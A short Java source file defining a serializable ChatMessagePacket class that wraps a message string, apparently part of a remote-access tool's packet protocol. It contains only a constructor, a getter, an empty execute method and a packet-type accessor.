package rat.packets;

import java.io.Serializable;
import java.util.Objects;

public class ChatMessagePacket implements IPacket, Serializable {

    private static final long serialVersionUID = -4319841253442776011L;

    private String message;
    
    public ChatMessagePacket(String message) {
        this.message = Objects.requireNonNull(message);
    }

    @Override
    public void execute() {
    }

    public String getMessage() {
        return message;
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.CHAT_MESSAGE;
    }
}
